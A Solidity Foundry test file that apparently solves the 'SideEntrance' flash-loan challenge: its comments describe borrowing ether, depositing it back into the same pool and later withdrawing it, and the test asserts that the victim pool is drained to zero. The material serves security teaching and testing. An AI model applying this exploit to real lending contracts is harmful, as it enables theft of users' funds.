// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool, Attacker} from "../src/SideEntrance.sol";

/**
 * @title SideEntrance Vulnerability Demonstration
 * @notice Demonstrates the exploitation of the flash loan mechanism in the SideEntranceLenderPool contract
 *
 * @dev The vulnerability exists because:
 * - The `flashLoan` function allows borrowing ether without strict checks on how it is returned.
 * - The borrowed ether can be used to `deposit` back into the same pool within the same transaction.
 * - This allows the attacker to withdraw the deposited ether after the loan transaction, effectively stealing it.
 *
 * Attack flow:
 * 1. Attacker contract calls `flashLoan` to borrow ether.
 * 2. Inside the `execute` function, called by `flashLoan`, the attacker uses the borrowed ether to call `deposit`.
 * 3. After `flashLoan` completes, the attacker calls `withdraw` to extract the funds that were just deposited.
 */
contract SideEntrance is Test {
    SideEntranceLenderPool public victim;
    Attacker public attacker;

    function setUp() public {
        victim = new SideEntranceLenderPool();
        vm.deal(address(victim), 100 ether);

        attacker = new Attacker(victim);
        vm.deal(address(attacker), 1 ether);
    }

    function test_attack() public {
        attacker.attack();

        uint256 balanceVictim = address(victim).balance;
        uint256 balanceAttacker = address(attacker).balance;

        assertEq(balanceVictim, 0 ether);
        assertEq(balanceAttacker, attacker.AMOUNT() + 1 ether);
    }
}
